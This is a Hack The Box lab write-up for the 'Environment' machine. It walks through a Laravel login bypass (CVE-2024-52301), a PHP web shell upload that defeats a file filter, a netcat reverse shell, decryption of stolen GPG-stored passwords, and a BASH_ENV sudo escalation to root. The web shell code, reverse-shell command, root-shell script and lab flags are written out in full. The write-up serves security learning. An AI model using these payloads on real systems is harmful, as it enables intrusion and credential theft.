---
layout: post
title: "Hack The Box: Environment"
date: 2025-09-06
categories: [HackTheBox, Writeup]
tags: [Linux, medium, file-upload, CVE-2024-52301, privilege-escalation]
permalink: /posts/Environment/
toc: true
---



Environment is an easy-difficulty Linux machine from Hack The Box where we exploited a **Laravel 11.30.0 CVE** using `--env=preprod` to bypass the login page and reach the file uploader to gain RCE on `www-data`→ enumerate a backup directory to recover a GPG-encrypted keyvault and private keys → import and decrypt it locally to obtain the `hish` user’s credentials → finally escalate to root by abusing the `env_keep+="ENV BASH_ENV"` misconfiguration in sudo to inject commands and spawn a root shell.

## **Enumeration**

### Nmap Scan

```bash
┌──(sanke㉿vbox)-[~/Downloads/environment]
└─$ nmap -A  10.10.11.67 -v 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 10:55 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:55

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://environment.htb
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

So, we have 2 open port 22/tcp ssh and 80/tcp HTTP which will be our target in this machine.

I started by opening the website after adding the environment.htb to /etc/hosts of course.

![Description](/assets/images/Environment/image(1).png)

Nothing suspicious in the website so i used feroxbuter to enumerate the directories. I guess there are hidden directories here

```bash
┌──(sanke㉿vbox)-[~/Downloads/envirnment]
└─$ feroxbuster -u http://environment.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50

                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://environment.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       32l      137w     6603c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l        9w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       27w     1713c http://environment.htb/build/assets/styles-Bl2K3jyg.css
200      GET        1l      119w     4111c http://environment.htb/build/assets/login-CnECh1Us.css
200      GET       54l      174w     2391c http://environment.htb/login
302      GET       12l       22w      358c http://environment.htb/logout => http://environment.htb/login
405      GET     2575l     8675w   244839c http://environment.htb/upload
200      GET       50l      135w     2125c http://environment.htb/up
405      GET     2575l     8675w   244841c http://environment.htb/mailing
200      GET       87l      392w     4602c http://environment.htb/
301      GET        7l       11w      169c http://environment.htb/storage => http://environment.htb/storage/
301      GET        7l       11w      169c http://environment.htb/storage/files => http://environment.htb/storage/files/
301      GET        7l       11w      169c http://environment.htb/build => http://environment.htb/build/
301      GET        7l       11w      169c http://environment.htb/build/assets => http://environment.htb/build/assets/
301      GET        7l       11w      169c http://environment.htb/vendor => http://environment.htb/vendor/

```

Okay, now we have something. We do have login page and we have /mailing also.

I tried accessing the /mailing directory and look what i found.

![Description](/assets/images/Environment/image(2).png)

We have laravel here with version defined as 11.30.0 

## **Exploitation**

First thing we do is trying to find a cve for this laravel version. What got my intention was this github page that speaks about a CVE-2024-52301.

https://github.com/Nyamort/CVE-2024-52301

So, What the poc is saying is to add after the /login a parameter “?—env=preprod” that will bypass the login page and forward us to http://environment.htb/management/dashboard

![Description](/assets/images/Environment/image(3).png)

After that forward the request and you will be automatically redirected to this page here as a user called “Hish”.

![Description](/assets/images/Environment/image(4).png)

I went to the profile section and look what i found

![Description](/assets/images/Environment/image(5).png)

It’s an upload page , I was trying many things but the trick here was to bypass the php file so he can succesfully execute a reverse shell on our terminal.

So, using the https://www.revshells.com/ I retrieved the reverse shell of the PHP

```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

But it wasn’t enough I created a file called rev.gif.php and added in the first line the header of the GIF which I found it in the internet “GIF87a” and even with this things i did , I wasn’t able to execute the reverse shell until i found out that adding a “.” after the name of my file will bypass the file error upload. So, I renamed it to “rev.gif.shell.”  and upload it.

![Description](/assets/images/Environment/image(6).png)

Let me now execute a simple netcat reverse to get the shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-IP> 1234 >/tmp/f
```

And in our listener we got the www-data user shell.

```bash
┌──(sanke㉿vbox)-[~/Downloads/envirnment]
└─$ nc -lvnp 1234              
listening on [any] 1234 ...
connect to [10.10.14.103] from (UNKNOWN) [10.10.11.67] 37058
bash: cannot set terminal process group (913): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$ cd /home
www-data@environment:/home$ cd hish
www-data@environment:/home/hish$ ls
backup  user.txt
www-data@environment:/home/hish$ cat user.txt
ce9f15a1c4f7a1d62260a4fbed9403a4

```

And we got our user flag!!! Let’s gooo !!

in the hish directory there was a backup that got keyvault.gpg file. So, we gonna decrypt this file using the key that we can found in /home/hish/.gnupg

First thing to do is transfer all those files to the attacker machine using the Python HTTP server.

```bash
www-data@environment:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.103 - - [06/Sep/2025 03:48:50] "GET /gnupg.tar.gz HTTP/1.1" 200 -
10.10.14.103 - - [06/Sep/2025 03:30:18] "GET /keyvault.gpg HTTP/1.1" 200 -

```

And after that i just extracted the tar file and used the gpg decryption to get the passwords.

```bash
┌──(sanke㉿vbox)-[~/Downloads/envirnment]
└─$ tar -xzf gnupg.tar.gz

┌──(sanke㉿vbox)-[~/Downloads/envirnment]
└─$ gpg --decrypt keyvault.gpg
    PAYPAL.COM -> Ihaves0meMon$yhere123
    ENVIRONMENT.HTB -> marineSPm@ster!!
    FACEBOOK.COM -> summerSunnyB3ACH!!
```

After i tried the 3 passwords with the hish user. I noticed the “marineSPm@ster!!” working on ssh.

```bash
ssh hish@10.10.11.67
marineSPm@ster!!
```

## **Privilige escalation**

We start with the classic enumeration step: checking `sudo -l`.

```bash
hish@environment:~$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo

```

The interesting part here is:

- The script `/usr/bin/systeminfo` can be run with `sudo`.
- The `sudo` configuration allows the environment variables `ENV` and `BASH_ENV` to be kept.
- Since `/usr/bin/systeminfo` is a **bash script**, it will load the file specified in `BASH_ENV` on execution.

This means we can abuse `BASH_ENV` to inject our own commands and get a root shell.

---

1. Create a malicious script that spawns a root shell:

```bash
echo "/bin/bash -p" > /tmp/rootme
chmod +x /tmp/rootme
```

1. Export it as `BASH_ENV`:

```bash
export BASH_ENV=/tmp/rootme
```

1. Run the vulnerable script with `sudo`:

```bash
sudo /usr/bin/systeminfo
```

1. This drops us into a **root shell**:

```bash
root@environment:/home/hish# cat /root/root.txt
788fb20e766ed6f427577ca9088e4aee
```

✅ Exploited `BASH_ENV` variable + sudo misconfiguration to escalate privileges to **root**.
